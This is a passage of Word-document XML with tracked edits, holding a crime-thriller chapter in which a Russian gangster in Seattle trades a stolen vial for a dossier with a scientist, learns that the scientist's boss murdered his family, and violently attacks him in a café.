      <w:del w:id="2503" w:author="TextVet" w:date="2016-03-23T16:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832465">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>made</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> distinct</w:t>
      </w:r>
      <w:ins w:id="2504" w:author="TextVet" w:date="2016-03-23T16:03:00Z">
        <w:r w:rsidR="00832465">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2505" w:author="TextVet" w:date="2016-03-23T16:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832465">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> rattling noises</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and he’d be damned if he was going to walk around the city jingling with medication like a goddamned geriatric. He was only forty-seven years old and still strong as an ox — his muscles lacked the definition they’d once had in his youth, but he was still as powerful as ever. And if any lousy cretin dared to look at him like some kind of poor frail invalid, he’d sooner stab the son</w:t>
      </w:r>
      <w:ins w:id="2506" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidR="00A62F0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2507" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A62F0D">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of</w:t>
      </w:r>
      <w:ins w:id="2508" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidR="00A62F0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2509" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A62F0D">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w:t>
      </w:r>
      <w:ins w:id="2510" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidR="00A62F0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2511" w:author="TextVet" w:date="2016-03-23T16:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A62F0D">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bitch’s eyes out than suffer a moment of pity.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aspirin worked quickly. The pain subsided, and Sergey resumed sipping his tea.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behind came a man’s voice. It was dry and aged. “Sergey Mukhayev,” it said with clear, crisp pronunciation. Rather than the lisping Anglicized bastardization to which he had grown accustomed over the last decade, the voice intoned his name with the true, rich, heavy consonants of a native Russian speaker. He turned and looked up. A gaunt, elderly face looked back at him through inscrutable blue eyes.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old man carried a manila envelope. He sat down across the table. “You’re a difficult man to contact, Sergey,” he said in Russian. “You don’t reply to email, your telephone goes straight to voicemail… Why, if that Leo boy hadn’t answered for you, I was about ready to send a courier over to your house.”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stared at him suspiciously. “I’ve had issues with my communication channels lately. Am I supposed to know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said the old man. “But it’s part of my job to know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pleasure’s all yours, then,” said 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am called Pyotr</w:t>
      </w:r>
      <w:ins w:id="2512" w:author="TextVet" w:date="2016-03-23T16:06:00Z">
        <w:r w:rsidR="00AC343B">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Passinsky. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Doctor</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:commentRangeStart w:id="2513"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Pyotr</w:t>
      </w:r>
      <w:ins w:id="2514" w:author="TextVet" w:date="2016-03-23T16:06:00Z">
        <w:r w:rsidR="00AC343B">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Passinsky</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2513"/>
      <w:r w:rsidR="00AC343B">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2513"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.” He spoke impeccable Russian with a highbrow Muscovite dialect. The accent fell upon the Russian ear similarly to the sound of High British to a native English speaker. The affectation connoted either great intelligence and fine breeding, or extreme arrogance and unadulterated pomposity.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old man extended a handshake. Sergey did not accept.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should respect your elders,” the old man scolded.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“Maybe I’d respect you,” said Sergey, “if I knew who the hell you are and what you want with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“Who I am is a victim of your aggression, and what I want is restitution,” Passinsky said. “Your men broke into my company last night, Sergey. Tungsten Medical Technologies. Well, it’s not </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> company, of course, but I’m responsible for it. Your barbaric little adventure makes me look very bad. And your timing could not be worse. My boss, as it so happens, is flying into town as we speak. I’m now, in addition to our scheduled affairs, forced to explain your uncouth actions.”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My</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> men? </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>My</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> actions? That’s quite some accusations you’re leveling there, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Doctor</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. I have no idea what you’re talking about.” Sergey’s voice was slow, shrewd, and snide. He had spent his youth in Saint Petersburg, on the humid shores of the Baltic Sea. It was a city of art and theatre, of literature and music, and of crime and corruption so brazen that it would have made Prohibition-era Chicago look like the Smurfs’ Village. Sergey’s subtle accent conveyed cleverness, ruggedness, and an attitude toward authority that could not be properly described in polite company.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old man jabbed an impatient hand into the manila envelope and withdrew a sheet of paper to lay on the table. Upon the paper was a screenshot of a security camera recording. It showed Eugene, clad in his now-destroyed Italian leather jacket, standing amid glassware and scientific equipment. He was holding a young woman at gunpoint with one of those tiny snubnose .44 Magnum hand-cannons of which he was so fond.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“Are you going to deny that this is your nephew Eugene?” asked Passinsky.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if I do?”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Passinsky’s eyes narrowed. “Kindly spare me the trouble, Sergey! I’m a scientist, not a judicial magistrate. I refuse to waste my time playing pointless mind-games with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smirked. “Then you shouldn’t have sat down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exhaled sharply through his nose. “Fine. In that case, let’s see if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one rings a bell…”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produced another paper, bearing an image of a man in his late thirties, wearing a lab coat and holding an odd contraption. Sergey recognized him from the factory: the technical savant who seemed to be plaguing him at every turn. Sergey’s fists clenched at the sight of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Passinsky gave a nod. “So, I take it he is familiar?”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growled, “I have… encountered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“Just as I thought, then,” said Passinsky. “It appears this fellow has been a thorn in both our sides. It may interest you to know that, from what I can tell, this is not his usual line of work. He’s a computer engineer. Highly skilled, but otherwise rather unremarkable. Aside from a few civilian contracts for the United States Navy, he doesn’t even appear to have any military affiliation.”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is he called?” Sergey hissed.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held up his manila envelope. “It is all here. His name, his address, his social groups, and so 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kept a poker face. “Supposing I was interested…”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rolled his eyes. “Sergey, you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> interested. I will not play silly games with you, you punk! Do you understand?”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do you want for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perfectly well what I want, Sergey,” said the old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“Suppose I didn’t bring it,” Sergey said standoffishly. “Suppose I came here only to find out who you are and what you have to offer. And now that I know, suppose I simply reach over this table, grab that envelope from your weak old hands, and walk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grimaced. “Even an overgrown Leningrad street urchin should at least feel some shame—”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called Saint Petersburg, you vegetable-brained geriatric,” Sergey interrupted. “It hasn’t been called Leningrad in over twenty years.”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“Consider it in practical terms,” Passinsky chided. “Why do you think I agreed to meet you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?” He leaned back and gestured to the throngs of people milling about the market. “Do you really think you’d be able to get away with attacking an old man in public?”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“Fine. But then, even someone as obviously senile as you should know better than to make me such a pathetic offer. A tube filled with priceless microbes, in exchange for some papers about some random man </w:t>
      </w:r>
      <w:commentRangeStart w:id="2515"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>whom I only care about as an afterthought?</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2515"/>
      <w:r w:rsidR="00D21D86">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2515"/>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vial is worthless to you,” Passinsky pressed. “You do not know how to use its contents.”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“Ah, but I know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want it very badly, and I’m quite certain you’d be willing to give me much more for it than…”</w:t>
      </w:r>
      <w:ins w:id="2516" w:author="TextVet" w:date="2016-03-29T15:14:00Z">
        <w:r w:rsidR="003E427B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2517" w:author="TextVet" w:date="2016-03-29T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E427B">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Sergey waved at the envelope.</w:t>
      </w:r>
      <w:ins w:id="2518" w:author="TextVet" w:date="2016-03-29T15:14:00Z">
        <w:r w:rsidR="003E427B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2519" w:author="TextVet" w:date="2016-03-29T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E427B">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No, good Doctor. I think I’ll keep what’s mine.”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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> yours,” </w:t>
      </w:r>
      <w:ins w:id="2520" w:author="TextVet" w:date="2016-03-23T16:14:00Z">
        <w:r w:rsidR="00DB52D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>snapp</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2521" w:author="TextVet" w:date="2016-03-23T16:13:00Z">
        <w:r w:rsidR="005B7CD3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2522" w:author="TextVet" w:date="2016-03-23T16:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B7CD3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Passinsky.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is now,” Sergey smirked.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elderly man sighed and leaned forward, clasping his hands. “Sergey, let me be clear. This exchange that I propose is strictly a professional courtesy. I sincerely hope that you hand over the vial amicably. Because if you do not, then I’ll have to have my boss’s men extract it from you by force. I would really prefer that the matter does not escalate to such a level — not because I give a damn about you, but because it would greatly displease my boss. And my boss is not a man I wish to displease further. So</w:t>
      </w:r>
      <w:ins w:id="2523" w:author="TextVet" w:date="2016-03-23T16:15:00Z">
        <w:r w:rsidR="002023F4">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that is why I extend to you the invitation of handling this by way of exchange — it is the closest I can come to a win-win solution. Do you understand?”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stared at the old scientist contemptuously.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stared back. “Need I remind you, I’ve already demonstrated that I know how to reach you, where you live, and who your family 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looked away with a snarl. Bitterly, he reached into his pocket, withdrew the small smiley-faced vial, and laid it on the table.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gave him the envelope, and took the vial in his liver-spotted fingers. “I’m glad we could come to an agreement.”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opened the envelope and examined the papers inside. “So… Are we done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said the old scientist, “there is perhaps another matter, more personal in nature.”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growled, “What is it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‘Daniel’ fellow… He’s built a most remarkable machine. A rifle that shoots a pulse of electromagnetic energy…”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yes.” Sergey groaned. “It kills electronics, I know.”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“From a technical perspective, I’m quite curious about this invention. If you were to procure it for me, I could reward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snorted. “That accursed piece of garbage? I’d sooner shove it into a trash compactor.”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a young man at my office helped me identify it. You’ll never believe where he recognized the device from. An old computer game! Delightful, isn’t it? And do you know what its function was in this computer game? Deactivating robots and… Another kind of monster… My young colleague used an amusing word for it: ‘cyborg’. Do you know what a cyborg is, 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shrugged, uninterested.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Sergey, you of all people really should learn this word. A ‘cyborg’, you see, is a creature that is part man, part machine. A man who’s had parts of his body replaced with electronic components. Parts that no longer function properly because of injury or illness. Do you understand my meaning, my friend?”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Slowly, Sergey’s bored demeanor morphed into angry indignation. He folded one arm across his chest, and leaned menacingly toward the old man. “The state of my body is absolutely none of your concern, you parasite-infested swine!”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is nothing to be ashamed about,” Passinsky said. “In fact, I would consider it a source of pride! A living embodiment of the power of technology over the weaknesses of the flesh.”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“Whose flesh are you calling ‘weak’, you decrepit cur? I could break you in half with a flick of my wrist!” Sergey snarled. “How the hell do you know these things about me? Why have you been watching me!? Who the hell do you think you are?”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shrugged innocently. “You were simply a part of my assignment, Sergey. It’s nothing personal. My boss knew you’d moved your operation to Seattle after your little falling-out in Leningrad— sorry, Saint Petersburg. And, because of both the location of Tungsten’s offices and the nature of our research objectives, he thought it would make sense to keep track of you. I think he wanted to hire you for some distribution work later. Which, of course, is no longer a possibility…”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Sergey’s fists clutched the sides of the table. “Why me? Why does your boss give a damn about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I don’t know the details,” Passinsky said nonchalantly. “</w:t>
      </w:r>
      <w:ins w:id="2524" w:author="TextVet" w:date="2016-03-23T16:18:00Z">
        <w:r w:rsidR="00FD62A6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>B</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2525" w:author="TextVet" w:date="2016-03-23T16:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD62A6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>b</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ut from what I understand, you two have a history. I hear you worked for him back in Saint Petersburg? Arranged some sales, apparently…”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Sergey’s throat seized. His pulse throbbed in his neck. “No…”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got the impression that something went sour between the two of you back then,” Passinsky continued. “He seemed extremely unhappy about something you’d done about ten years ago…”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crowded pavilion spun around Sergey’s head, the shifting forms of shoppers and tourists suddenly making him feel nauseous. His breathing grew shaky.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“Something about… What was it?” Passinsky went on. “You kept too large a commission for yourself? Something along those lines? You lied about the size of a sale so you could keep the difference? He never told me exactly what it was, and I never bothered to ask…”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hearing began to fade. In the periphery of his vision, Sergey could see intricate patterns of capillaries, surging with blood.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added, “He’s called Ivan…”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shot up from his chair. Standing, he lifted the metal patio table a few inches and slammed it back down. The delicate cup of tea, along with its saucer, tumbled and shattered against the patio deck.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murdered my family!” Sergey screamed.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Passersby gasped at the outburst and stared in shock. Patrons seated nearby backed away. Café staff glanced back and forth to decide which one of them should say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flinched but remained seated. His face displayed nothing more than simple annoyance.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killed Sveta! And Vadik! His men broke into my home! They gassed me and electrocuted me with cattle prods! They tied me down and forced me to watch! Do you know what he did to them? Do you know!?”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Passinsky avoided eye contact. “I know what kind of man my boss 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suddenly looked away and gasped, “Your boss…! Ivan is your boss…!”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Passinsky nodded. “He’s </w:t>
      </w:r>
      <w:del w:id="2526" w:author="TextVet" w:date="2016-03-23T16:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008454FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2527" w:author="TextVet" w:date="2016-03-23T16:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008454FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> man </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2528" w:author="TextVet" w:date="2016-03-23T16:19:00Z">
        <w:r w:rsidR="007A5B07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>who</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2529" w:author="TextVet" w:date="2016-03-23T16:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007A5B07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> wires my paychecks. He created a fictitious investment consortium to move funds into the United States, but he’s the consortium’s sole member. Tungsten is his company.”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“Tungsten is his company…” Sergey repeated, his eyes wide with panic.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shrugged. “Of course. Surely you didn’t think that a company whose sole project is a new source of cocaine would have an entirely scrupulous investment provider.”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“Tungsten is Ivan’s company…,” Sergey stuttered. “It’s Ivan’s company… And I… Last night, I… Oh dear God…! And he’s coming? Ivan’s coming? Here? Today?”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was already on his jet when I talked to him earlier this morning,” said Passinsky. “He’s landed by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he doesn’t know, right?” Sergey said, his voice a combination of fury and pleading. “He doesn’t know that I… That my men… That we…”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grunted. “Don’t be silly, Sergey. Of course he knows. I told him. And let me tell you, that was not a phone call that I enjoyed having to—”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small table flew aside with a swipe of Sergey’s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grabbed the scientist by the collar, and hoisted him to his face. “You son</w:t>
      </w:r>
      <w:ins w:id="2530" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidR="00EE4534">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2531" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE4534">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of</w:t>
      </w:r>
      <w:ins w:id="2532" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidR="00EE4534">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2533" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE4534">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w:t>
      </w:r>
      <w:ins w:id="2534" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidR="00EE4534">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2535" w:author="TextVet" w:date="2016-03-29T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE4534">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bitch!” Sergey screamed, along with a litany of colorful invectives whose rich meanings would be lost in translation. He shook the frail gray form while the old man stammered and demanded that the brute unhand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crowd erupted in protest. The commotion had put bystanders at alert, and many had already been preparing to intervene. Men rushed in — café staff, passersby, fellow patrons — to pull the large man off </w:t>
      </w:r>
      <w:del w:id="2536" w:author="TextVet" w:date="2016-03-23T16:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A10E8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the elderly scientist. Women shielded the aged victim, shouted for help, called out for anyone who might speak Russian to come and translate.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fought back against the pull of many arms around him, grabbing at him, restraining him, forcing him down…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Just like he’d done so many years ago… When the men broke into his house on a frigid Saint Petersburg morning… When they’d knocked the gun from his hand, he grabbed a lamp, and bashed it against their skulls… And when the lamp broke, he continued with his fists… His mighty muscles burning with adrenaline… His wife, Sveta, running to the nursery… Rosie in her crib, crying, screaming… Vadik, his son, six years old, biting, kicking, trying to fend them off with a plastic toy sword… His head reeled from the ether they’d tried to knock him out with… But he would not be subdued, not by these men, not when his family was at stake… And suddenly his entire skeleton rattled within his flesh as cattle prods stabbed his ribs… And his chest felt like it was being crushed in a vise, and there was an arrhythmic fluttering from behind his sternum, and everything tilted and went black…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picked one hand at random from the many that held him. He grabbed its wrist and gave a twisting yank. There was a 